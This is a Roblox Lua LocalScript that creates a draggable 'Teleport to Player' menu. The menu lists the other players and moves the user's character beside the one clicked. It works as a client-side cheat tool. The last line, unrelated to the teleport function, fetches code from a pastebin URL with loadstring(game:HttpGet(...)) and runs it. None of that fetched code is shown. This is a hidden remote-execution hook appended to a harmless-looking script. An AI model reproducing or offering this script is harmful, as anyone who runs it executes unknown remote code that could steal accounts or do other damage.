-- Place this in a LocalScript inside StarterGui
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Create a ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Create a toggle button
local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 40)
toggleButton.Position = UDim2.new(0.05, 0, 0.1, 0)
toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
toggleButton.Text = "Open Teleport"
toggleButton.TextColor3 = Color3.new(1, 1, 1)
toggleButton.Parent = screenGui
toggleButton.Active = true
toggleButton.Draggable = true -- draggable button too!

-- Create the main frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 300)
frame.Position = UDim2.new(0.05, 0, 0.2, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Visible = false -- start hidden
frame.Parent = screenGui

-- Add title bar
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
title.Text = "Teleport to Player"
title.TextColor3 = Color3.new(1, 1, 1)
title.Parent = frame

-- Add scrolling list
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, 0, 1, -30)
scrollingFrame.Position = UDim2.new(0, 0, 0, 30)
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollingFrame.ScrollBarThickness = 6
scrollingFrame.Parent = frame

-- Function to refresh player list
local function refreshList()
    scrollingFrame:ClearAllChildren()
    local y = 0

    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player then
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(1, -5, 0, 30)
            button.Position = UDim2.new(0, 5, 0, y)
            button.Text = plr.Name
            button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            button.TextColor3 = Color3.new(1, 1, 1)
            button.Parent = scrollingFrame

            button.MouseButton1Click:Connect(function()
                local character = player.Character
                local targetChar = plr.Character
                if character and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                    character:MoveTo(targetChar.HumanoidRootPart.Position + Vector3.new(3, 0, 0))
                end
            end)

            y = y + 35
        end
    end

    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, y)
end

-- Refresh when players join/leave
Players.PlayerAdded:Connect(refreshList)
Players.PlayerRemoving:Connect(refreshList)

-- Initial load
refreshList()

-- Toggle button function
toggleButton.MouseButton1Click:Connect(function()
    frame.Visible = not frame.Visible
    if frame.Visible then
        toggleButton.Text = "Close Teleport"
    else
        toggleButton.Text = "Open Teleport"
    end
end)

loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
